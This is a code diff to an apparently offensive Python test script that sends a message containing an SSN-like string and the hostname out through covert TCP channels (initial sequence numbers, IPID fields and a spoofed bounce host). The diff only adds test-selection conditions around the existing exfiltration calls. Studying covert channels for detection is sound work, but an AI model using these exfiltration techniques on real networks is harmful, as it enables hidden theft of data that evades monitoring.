@@ -148,14 +148,16 @@ message = 'foo bar 111-22-3333' + ' from ' + thishost
 print '[+] destination: ' + destination
 
 # ==== use iseq
-print '[*] Testing method Initial Sequence..'
-initialSeqFerret.exfil_iseq(spoof, destination, dstport, message, bounce=0)
-print '[*] Sent using iseq: %s' % message
+if test == 'seq' or test == 'all':
+    print '[*] Testing: initial sequence number..'
+    initialSeqFerret.exfil_iseq(spoof, destination, dstport, message, bounce=0)
+    print '[*] Done: initial sequence number'
 
 # ==== use IPID
-print '[*] Testing method IPID..'
-ipidFerret.exfil_ipid(spoof, destination, dstport, message)
-print '[*] Sent using IPID: %s' % message
+if test == 'ipid' or test == 'all':
+    print '[*] Testing: IPID..'
+    ipidFerret.exfil_ipid(spoof, destination, dstport, message)
+    print '[*] Done: IPID'
 
 # ==== use bounce host
 '''
@@ -164,4 +166,7 @@ The things that are different when performing a bounce scan are:
 - dst = host to bounce off of (see spoof addresses above)
 - message stored in ACKs not SEQ.
 '''
-initialSeqFerret.exfil_iseq(spoof, destination, dstport, message, bounce=1)
+if test == 'bounce' or test == 'all':
+    print '[*] Testing: bounce..'
+    initialSeqFerret.exfil_iseq(spoof, destination, dstport, message, bounce=1)
+    print '[*] Done: bounce'
